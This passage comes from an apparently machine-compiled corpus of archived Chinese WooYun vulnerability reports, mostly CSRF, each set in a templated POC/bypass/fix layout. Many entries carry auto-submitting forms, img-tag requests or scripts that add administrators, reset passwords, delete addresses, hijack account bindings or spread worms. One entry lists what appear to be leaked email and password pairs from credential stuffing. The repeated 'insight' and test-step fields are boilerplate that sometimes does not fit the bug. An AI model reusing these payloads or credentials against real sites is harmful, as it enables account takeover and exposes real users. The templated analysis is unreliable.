**POC**: 把上面的请求放到了 <img> 中html的源码是<img src="http://localhost/metinfo/admin/admin/save.php?action=add&useid=hacked&pass1=hacked&pass2=hacked&name=Hacked&sex=0&tel=&mobile=01234567890&email=hacked%40hacked.com&某互联网公司=&msn=&taobao=&admin_introduction=&admin_group=3&langok_cn=cn&admin_op0=metinfo&admin_op1=add&admin

**绕过**: 直接利用

**修复**: 增加TOKEN防护
---

---
### [wooyun-2012-07600] Xweibo插件一处csrf
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Xweibo插件一处csrf可以偷偷取消别人的新郎某社交平台绑定

**POC**: src=https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 。
---

---
### [wooyun-2013-044692] 大众点评一处csrf漏洞
**厂商**: 大众点评 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你为何忽略我两个洞？你为何就不肯发一个礼物给我？ 你为何https://example.com/[已脱敏] 你为何要这么厉害
---

---
### [wooyun-2015-0132870] 潇湘书院任意重置密码漏洞（CSRF）
**厂商**: 潇湘书院 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这里有个修改注册邮箱我们抓包看看get 方式提交的 明显就是CSRF了我们访问下

**POC**: 你们家的防注册机制我也无力可说都多长时间了 还不让注册然后我就不测试了，漏洞确实存在

**绕过**: 直接利用

**修复**: 验证token
---

---
### [wooyun-2012-09090] 对WooYun-2012-08606的再次CSRF利用
**厂商**: 爱拍 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 21号提交的漏洞，当天就确认漏洞了，做出了反应。这几天，再上爱拍的时候发现，粉丝还在增长，就去看看什么原因。在去利用这个地址在没有来源的情况下提交，信息框提示“无效的请求方式”，很明显是修复过。之前我在BBS中回帖用img标签引用过这个地址，会不会是这个问题呢，于是，我就再一次用img标签引用这个地址，去回帖。过了一下，有粉丝了，我看了看粉丝的名字，对比了其他回帖人的名字，果然中招了。所以，可以得出他们是这样修复的：设置了接口只允许来自*.aipai.com的请求这样的修复显然是有问题的，没有考虑到来自论坛的调用，论坛的地址是bbs.aipai.com，所以就通过了接口的来源检查。在论坛中进行CSRF效果更好，因为用户都是登陆状态，危害更大。

**POC**: 在BBS回帖中、个人签名中插入以下代码。[img]https://example.com/[已脱敏]]&callback%09=scribeSuccess_new&action=addSubscribe[/img]

**绕过**: 直接利用

**修复**: 再详细一点接口的来源检查，用户加关注通常都是在视频页中的，所以将接口的来源设置设置成只允许www.aipai.com的请求，同时使用POST代替GET，加TOKEN也是很重要的。Ps、烦请清掉imlonghao(拍子号：11709754)的所有粉丝，或者直接封掉(我不怎么玩爱拍 - -||)。处理下
---

---
### [wooyun-2015-0129301] 方维某系统漏洞可修改用户密码(demo演示、通用型)#2
**厂商**: fanwe.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="email" value="296864045@某域名.com" /><input type="hidden" name="user_name" value="hackimg" /

**绕过**: 直接利用

**修复**: 加上验证机制。总结：贵公司开发的系统已经有两款有这样的漏洞存在，这是我提交的第二个系统发生同样的问题，而且有一个缺陷就是密码已经修改了，账号还是登陆的状态！
---

---
### [wooyun-2014-067384] phpokcms 4.x CSRF漏洞
**厂商**: phpok.com | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: phpokcms存在csrf漏洞，管理员查看会员列表时不知不觉会自动添加新的系统管理员。位置在会员头像处的img标签，由于新闻评论可显示头像，也可蠕虫发评论。下面仅证明添加管理员的部分。具体代码分析了，直接poc。

**POC**: 注册会员后打开如下链接。（域名路径请视情况修改）http://[IP已脱敏] 密码为admin2的系统管理员已经添加成功。）再打开设置，管理员维护去看一下即可。

**绕过**: 直接利用

**修复**: 修改设置头像接口，将url固定。 同时加强对关键功能的csrf控制，加入二次确认，或token。
---

---
### [wooyun-2013-040569] 大街网csrf为指定公司刷粉丝
**厂商**: 大杰世纪科技发展（北京）有限公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 没错。大街网也有粉丝可以刷。。。对比了一下。发现人气差距还真的不是一般的大啊。当我点击关注的时候，会发送这样一个post请求单独的请求一下发现提示已关注。切换账号为b，点击刚才的请求。发现账号b也关注了奥迪公司。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0128126] 国美旗下商城存在CSRF漏洞
**厂商**: 国美控股集团 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]  可添加添加收货地址https://example.com/[已脱敏]

**POC**: 删除收货地址   id随便改POC<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="memberAddressId" value="3800" /><input type="hidden" name="isDefault" value="" /><input type="hidden" name="address1" value

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2014-068706] 建站之星敏感功能csrf 可dump数据库
**厂商**: 建站之星 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台备份数据库的功能没有防御csrf。导致csrf dump数据库。数据库的名字可控，路径已知。在以下路径可以找到备份数据库的功能。该请求如下：没有防御csrf备份数据库的名字可以自定义，路径已知。可以直接获取到。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-017947] 搜房网某社交平台蠕虫
**厂商**: 搜房网 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用各种鸡肋的结合进行蠕虫挂马 黑链 刷粉 广告 盲打后台另可抓任意妹纸账号密码 还是实名制的....看了下别人发布的关于你们的漏洞感觉不怎么重视 请重视房产实名数据 身份证 名字 都有 黑产的最爱

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 目测网站跟筛子似的..重点做好过滤 你们懂的
---

---
### [wooyun-2015-0125211] 蜜淘网任意更改他人收货地址CSRF漏洞
**厂商**: 蜜淘网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看到收货地址 立马抓包查看下 发现是get方式提交的，明显的CSRF漏洞一枚啊我们构造pocok  我们开个帐号我们访问poc  请看结果

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 增加token就可以了
---

---
### [wooyun-2015-0142622] 某视频网站 csrf 获取历史观看记录
**厂商**: 某视频网站.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 历史记录api是：https://example.com/[已脱敏] domain="*" secure="false"/></cross-domain-policy>使用flash即可直接Get到json然后post到自己服务器上就行了

**POC**: 我用ajaxf制作了一个页面，受害者只要访问这个页面，历史记录和用户mid就会被上传到预置的服务器当中。受害者需要保留有某视频网站的cookie，即在线。攻击演示<video href="https://example.com/[已脱敏]"/>没钱买某视频网站云会员，糊着将就下吧。。注意前10秒标注的用户名cting00与后面ftp服务器上出现的txt里的用户名一样，观看记录也一样。

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2010-0641] 某社交平台CSRF利用2：自动添加关注，并自动发某社交平台
**厂商**: 某互联网公司 | **年份**: 2010 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登录后访问构造出的表单，就能添加“小锅盖头”为关注。

**POC**: <form method="POST" name="CSRF" action="https://example.com/[已脱敏]"><input type="hidden" name="name" value="value"/></form><script>document.CSRF.submit();</script>

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-020973] 乌云zone一处csrf导致任意加精华
**厂商**: 乌云官方 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 加精华处未验证token，且请求为get，如下https://example.com/[已脱敏] src="https://example.com/[已脱敏]"/]（此处的&n=.jpg是为了伪装成图片，使得可以正常加载）

**POC**: (见原文)

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2015-0100519] bagecms csrf可以获取任意数据
**厂商**: bagecms.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 增加管理员的时候，burp suite截获，发现存在csrfcsrf poc<html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="http://localhost/bagecms/index.php?r=admini/admin/create" method="POST"><input type="hidden" name="Admin&#91;username&#93;" value="test" /><input type="hidden" name="Admin&#91;password&#93;" value="test" /><input type="hidden" name="Admin&#91;email&#93;" value="test&#64;test&#46;

**POC**: 添加管理员成功管理员登陆，可以获取数据库信息等

**绕过**: 直接利用

**修复**: 建议增加请求url操作的权限，或者增加全局csrf防御增加token验证HTTP头的Referer用XMLHttpRequest附加在header里
---

---
### [wooyun-2015-0125210] 佳品网 csrf又一枚 随意删除他人收货地址
**厂商**: 佳品网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 删除收货地址1，抓包新建收货地址2构造csrf链接，主要代码：xmlhttp.open("get", "https://example.com/[已脱敏] ", true);访问伪造的请求收货地址，已被成功删除。刷新，查看收货地址，验证下address_id为6位纯数字，完全可遍历，后患无穷

**POC**: 同上

**绕过**: 直接利用

**修复**: 加token验证referer
---

---
### [wooyun-2010-0592] 某搜索引擎空间潜在的CSRF蠕虫威胁
**厂商**: 某搜索引擎 | **年份**: 2010 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某搜索引擎wap和web的cookie没用分离,登录web后就自动登录了wap,而wap的接口比较脆弱,易于攻击.wap发文章处数据提交类型默认的是Post,但经过测验,Get提交后也能成功,并且该接口并无Token之类的验证,唯一需要知道的是当前用户的用户名,这个可以参照SOBB-05中的方法获取.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: web和wap的cookie分离.
---

---
### [wooyun-2014-048752] 某视频网站一处CSRF刷关注
**厂商**: 奇艺 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 没有对referer验证，没有加token导致

**POC**: 找了一位用户进行关注然后抓包得到是POST提交访问如下poc页面<html><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><body><form name="csrf" action="https://example.com/[已脱敏]" method="POST"><input type=text name="star_uids" value="2108875392"></input><input type="submit" value="submit" /></form><s

**绕过**: 直接利用

**修复**: 检查POST来路Referer，在POST的信息中加token礼物不要啦，但高分还是要的。
---

---
### [wooyun-2013-016118] 某社交平台邮箱存csrf，黑白名单随便设置
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 邮箱在设置黑白名单的时候存在csrf，而且完全没有判断是否当前用户，危害还是蛮大的，应用场景：1.比如别人把我加黑名单，我用另外一个给他发邮件，他点击后把黑名单的邮件地址可以变成白名单2.比如我知道对方一直和一个公司或者个人邮件往来，我可以发邮件给他把那个人或域直接加入黑名单，而那个人根本不知道个人认为直接加黑名单方式危害更大，比如商业上的恶意竞争，最后查出来是某社交平台邮箱的问题的话就囧了

**POC**: 给个加黑名单的把，白名单和域的黑白名单应该也有这个问题<html><body><form id="wrhoooo" name="wrhoooo" action="https://example.com/[已脱敏]" method="post"><input type="test" name="items" value="test@123.com" /><input type="test" name="blacklist" value="1" /><input type="test" name="a" value="add_antispam" /><

**绕过**: 直接利用

**修复**: 加一个随机token吧，验证下referer，注意正则，别被绕过了
---

---
### [wooyun-2015-0155302] 改图网删除收货地址存在csrf
**厂商**: gaitu.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 删除收货地址处存在csrf，其他地方请逐一排查。删除收货地址，抓包拦截;可以看到消息体中国有csrf_token参数，但是实为虚设，因为其为固定值，另外地址id为纯数字自增值，故不存在不可预测参数，伪造恶意链接，主要代码如下：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("ajaxType=8&id=142623&csrf_token=7068c3f1-ffd9-4215-bd29-a559011b4c67");访问该链接：刷新，地址已被成功删

**POC**: 同上

**绕过**: 直接利用

**修复**: 验证referer随机token
---

---
### [wooyun-2015-0108173] PHPSHE csrf修改管理员密码
**厂商**: phpshe.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、一看修改管理员密码不要原密码验证抓包查看没有toekn值验证2、构造表单进行修改成修改不过这样发给管理一看就知道被修改了3、 我们新建一个html，代码如下<html><table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>乌云测试</h1></td></tr></tbody></table><<meta http-equiv="refresh" content="4;url=https://example.com/[已脱敏]"> <!--设

**POC**: 1、一看修改管理员密码不要原密码验证抓包查看没有toekn值验证2、构造表单进行修改成修改不过这样发给管理一看就知道被修改了3、 我们新建一个html，代码如下<html><table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>乌云测试</h

**绕过**: 直接利用

**修复**: token 值验证还有修改要原密码验证
---

---
### [wooyun-2015-0122200] 蜻蜓fm某站存在心脏滴血漏洞
**厂商**: qingting.fm | **年份**: 2015 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、地址：https://example.com/[已脱敏] openssl.py star.cms.qingting.fm|more >>E:\qingting.fm.txt<code>Connecting...Sending Client Hello...Waiting for Server Hello...... received message: type = 22, ver = 0302, length = 66... received message: type = 22, ver = 0302, length = 3685... received message: type = 22, ver = 0302, length = 331... received message: type = 22, ver = 0302, length = 4S

**POC**: 如上

**绕过**: 直接利用

**修复**: 升级修复！~~~
---

---
### [wooyun-2015-0135108] 手礼网CSRF可劫持收货地址
**厂商**: shouliwang.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、添加收货地址，抓包生成POC2、POC：<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="sysNo" value="" /><input type="hidden" name="name" value="test" /><input type="hidden" name="address" value="test" /><input type="hidden" name="district" value="3544" /><input type="hidden" name="cellPhone" value="13278721234" /><input type="hi

**POC**: (见原文)

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2010-0102] 某搜索引擎某系统登陆页面跨站及CSRF漏洞
**厂商**: 某搜索引擎 | **年份**: 2010 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]"/><script>alert(/liscker/);</script>&username=xxhttps://example.com/[已脱敏]"/><script>alert(/liscker/);</script>POST /report/accounts/checkLogin HTTP/1.1Host: data.baidu.comAccept: */*Referer

**绕过**: 直接利用

**修复**: 过滤跨站关键字时间戳变量验证码
---

---
### [wooyun-2014-064882] Discuz CSRF删除群组分类
**厂商**: Discuz! | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: admin_group.php} elseif($operation == 'deletetype') {//没有验证fromhash导致可以csrf删除$fid = $_GET['fid'];$ajax = $_GET['ajax'];$confirmed = $_GET['confirmed'];$finished = $_GET['finished'];$total = intval($_GET['total']);$pp = intval($_GET['pp']);$currow = intval($_GET['currow']);if($ajax) {ob_end_clean();require_once libfile('function/post');$tids = array();foreach(C::t('forum_thread')->fetch_all_by_fid(

**POC**: 开启群组功能之后发帖添加一个img标签 图片志向http://[IP已脱敏] 可以遍历一下 即可删除所有分组

**绕过**: 直接利用

**修复**: fromhash验证
---

---
### [wooyun-2010-0584] apache默认配置文件导致存在json劫持
**厂商**: apache | **年份**: 2010 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 虽然默认配置下cgi-bin/printenv或者cgi-bin/printenv.cgi printenv.pl返回的数据HTTP头是txt的，但是由于返回的数据库符合json格式，可能导致json劫持，此数据不受httponly的影响

**POC**: dork: inurl:cgi-bin/printenv<script src=https://example.com/[已脱敏])</script>注意你得有他的COOKIE才行啊，呵呵

**绕过**: 直接利用

**修复**: rm -rf 啊，不然还怎样....
---

---
### [wooyun-2015-0119684] 米折网漏洞小礼包
**厂商**: 米折网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: CSRF漏洞，在修改个人资料处。在保存资料处抓包，请求的数据我就不贴上了，传输的都是明文。SCRF POC代码如下：<html><head><title>Csrf Poc</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="nick" value="cnhackers"><input type="hidden" name="sex" value="1"><input type="hidden" name="age" 

**绕过**: 直接利用

**修复**: 加上token或其他认证。还有就是请求的那些值建议加密一下吧，传输的都是明文。礼物在哪里欧耶！
---

---
### [wooyun-2015-0127934] 有品CSRF全站收货地址任意删除（影响账号数据）
**厂商**: picooc.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] CSRF PoC - generated by Burp Suite Professional --><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="receiver" value="�#152;&#191;�#137;&#147;�#174;&#151;�#137;&#147;" /><input type="hidden" name="province" value="�#164;&#169;�#180;&#165;" /><input type="hidden" name="city" value="�#178;&#179;�

**POC**: 还多出个别人的收货地址。。

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2016-0169000] 点我的链接我就可能会进入你的某视频网站账号
**厂商**: 某视频网站.com | **年份**: 2016 | **类型**: CSRF

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在某视频网站上，用户是允许绑定某社交平台登陆的，然而绑定的接口是可以CSRF的，也就是说当用户登录后，点击我的链接，我就可以调用该接口完成绑定，绑定后就可以用我使用的某社交平台进行登录了。具体接口如下：https://example.com/[已脱敏] 注册一个某社交平台，然后用某社交平台授权给某视频网站。要先授权的原因是在伟哥的漏洞中已经提到过，这里引用并修改一下：“某社交平台某社交平台的授权有如下特点，如果当前登陆的某社交平台曾经授权过某视频网站，那么就会自动绑定成功”0x02 用一个隐藏的iframe在用户的浏览器上登录我们指定的某社交平台。这里使用到的接口有个问题需要注意，就是请求参数中password_4555和vk=4555_a3b5_1907935541，这两个参数是在http://l

**POC**: 我直接给出我写个一个flask程序，依赖flask和beautifulsoup，就不在我自己的主机上搭测试环境了。$ pip install flask beautifulsoup && python server.pyserver.py，自己改一下weibo_username和weibo_password吧。# -*- coding: utf-8 -*-import requestsimport refrom flask import Flaskfrom BeautifulSoup import BeautifulSoupapp = Flask(__name__)login_weibo_fo

**绕过**: 直接利用

**修复**: 修复绑定接口的CSRF。
---

---
### [wooyun-2012-08367] 福建网龙旗下某站CSRF礼包
**厂商**: 福建网龙 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。

**POC**: 【第一处】漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="tid" value="" /><input type="text" name="content" value="XX" /><input type="text" name="secret" value="0" /><input type="text" name="

**绕过**: 直接利用

**修复**: 检查POST来路Referer在POST的信息中加token
---

---
### [wooyun-2015-0110095] 果壳某处可被用于撞库（已验证可登录）
**厂商**: 果壳传媒 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天李姐姐大婶在zone社区发布了一款神器 拿来测试一下 效果相当不错由于数据量少 就拿了一个裤子进行测试 成功条数14条果壳登录接口可被用于撞库 已验证可登录POST /sign_in/?success=https%3A%2F%2Faccount.guokr.com%2Foauth2%2Fauthorize%2F%3Fclient_id%3D32353%26redirect_uri%3Dhttp%253A%252F%252Fwww.guokr.com%252Fsso%252F%253Flazy%253Dy%2526rid%253D691603653%2526success%253Dhttp%25253A%25252F%25252Fwww.guokr.com%25252F%26response_type%3Dcode%26state%3De9c1fee646be06a781a33d44a9

**POC**: littlefaith@126.com----f298731227injuin@某邮箱.com----zl810315ricky_eternal@某邮箱.com----7uko098iqimu819@某邮箱.com----1992819zy350346350@某域名.com----5059758a444589012@某域名.com----wo58835303517965249@某域名.com----517965249550188534@某域名.com----zxcv123ssaleey@126.com----ss41913612yooo123321@某邮箱.com----yt1994518278732

**绕过**: 直接利用

**修复**: 添加验证码，限制账号尝试多次登入
---

---
### [wooyun-2011-02157] 某社交平台一处referer限制不严的csrf发帖漏洞
**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某社交平台一处csrf发帖漏洞，referer限制不严，可以传播蠕虫

**POC**: 一键转发某社交平台的地方，若来源页为https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="post" name="myform" id="myform"><input type="hidden" name="content" value="这个姑娘的胸好美啊 https://example.com/[已脱敏] <?php echo rand(1,1000000);?>"/><input type="hidden" name="url" value="http

**绕过**: 直接利用

**修复**: referer过滤严格点
---

---
### [wooyun-2014-048935] 某游戏公司页游平台可通过CSRF密保问题+密码找回重置密码
**厂商**: 52xinyou.cn | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不知道靠不靠谱撒本来想测密码找回有没有问题的，方式就是两种，绑定邮箱和通过密保问题。邮箱的话，貌似没啥问题，然后密保问题的话，试了一下，开通密保问题的，会提示密保错误，未开通密保问题的，也会有相应提示，然后就去想，既然你没设置密保问题，那么我能不能先帮你设置呢，然后我在利用设置的密保问题和答案找回？于是就这样了。设置成功注意，该csrf仅针对未设置密码问题的用户。通过CSRF漏洞，我们就帮别人设置了他的密保了。然后我们去密码找回那里，填入密保问题就重置了密码了。

**POC**: 不知道靠不靠谱撒本来想测密码找回有没有问题的，方式就是两种，绑定邮箱和通过密保问题。邮箱的话，貌似没啥问题，然后密保问题的话，试了一下，开通密保问题的，会提示密保错误，未开通密保问题的，也会有相应提示，然后就去想，既然你没设置密保问题，那么我能不能先帮你设置呢，然后我在利用设置的密保问题和答案找回？于是就这样了。设置成功注意，该csrf仅针对未设置密码问题的用户。通过CSRF漏洞，我们就帮别人设置了他的密保了。然后我们去密码找回那里，填入密保问题就重置了密码了。

**绕过**: 直接利用

**修复**: 我去玩全民飞机大战了。
---

---
### [wooyun-2012-08514] 某社交平台某社交平台某处CSRF漏洞
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。

**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="poll_id" value="1742981" /><input type="text" name="content" value="XXXXXXXXXXX" /><input type="text" name="is_first" value="0" 

**绕过**: 直接利用

**修复**: 检查POST来路Referer在POST的信息中加token
---

---
### [wooyun-2014-086193] 某通信厂商花粉俱乐部网站存在CSRF
**厂商**: 某通信设备厂商 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某通信厂商 花粉俱乐部 网站存在CSRFcn.club.vmall.com

**POC**: 1.注册一个花粉俱乐部网站账号，随便发个帖子，2.把发帖的POST请求拦截下来,发现没有防御CSRF的token3.CSRF预防主要有token和referer。因此，还需要对referer进行测试。经过测试，发现修改为其它网站（如：某搜索引擎）时，帖子发送失败4.修改为空时，帖子发送成功。5.最后，构造自动提交的CSRF PoC6.victim host点击后，帖子成功发布

**绕过**: 直接利用

**修复**: 你懂得 ^_^
---

---
### [wooyun-2012-016117] 某手机论坛存在CSRF漏洞
**厂商**: 某手机厂商 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 背景：某手机厂商的手机本身有flyme远程账户，用于存储通讯录、短信等私密信息。核心：论坛改版后可使用flyme帐号密码登录论坛.自评：个人给予漏洞等级：高。原因在于用户的通讯录以及私密短信泄漏，并且可操作flyme帐户金额、远程锁定手机等功能。还有很多操作可以执行例如修改CSS样式等操作。不一一列举了。

